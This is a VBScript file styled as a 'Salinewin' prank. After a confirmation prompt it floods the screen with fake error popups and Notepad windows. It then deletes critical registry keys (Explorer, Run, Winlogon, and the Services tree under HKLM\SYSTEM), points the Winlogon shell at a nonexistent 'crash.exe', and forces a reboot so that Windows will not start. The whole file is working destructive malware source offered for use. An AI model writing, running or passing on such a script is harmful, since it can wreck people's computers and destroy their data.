Set shell = CreateObject("WScript.Shell")
Set fso = CreateObject("Scripting.FileSystemObject")

' =============== WARNING MESSAGE ====================
answer = MsgBox("WARNING: This script will corrupt the registry and make Windows unbootable. Are you sure you want to continue?", 36, "!!! DANGER !!!")

If answer <> 6 Then
    MsgBox "Operation cancelled.", 64, "Salinewin"
    WScript.Quit
End If

' =============== PRANK PHASE ====================
For i = 1 To 10
    shell.Popup "SALINEWIN.EXE ERROR 0x" & Hex(Int(Rnd * 999999)), 1, "salinewin.exe", 48
    shell.Run "notepad"
    shell.SendKeys "SALINEWIN ERROR {ENTER}"
    WScript.Sleep 100
Next

' Flash screen chaos
For i = 1 To 3
    shell.SendKeys "^+{ESC}"
    shell.SendKeys "%{TAB}"
    shell.SendKeys "{ESC}"
    WScript.Sleep 200
Next

' =============== REGISTRY CORRUPTION ====================
keys = Array( _
    "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer", _
    "HKCU\Software\Microsoft\Windows\CurrentVersion\Run", _
    "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon", _
    "HKLM\Software\Microsoft\Windows\CurrentVersion\Run", _
    "HKLM\SYSTEM\CurrentControlSet\Services" _
)

For Each key In keys
    On Error Resume Next
    shell.RegDelete key & "\"
Next

' Break Windows shell
shell.RegWrite "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Shell", "crash.exe", "REG_SZ"

' =============== FINAL MESSAGE & RESTART ====================
WScript.Sleep 2000
shell.Popup "Critical system failure. Restarting...", 3, "salinewin.exe", 16
shell.Run "shutdown -r -t 5 -c ""System failure caused by salinewin.exe"""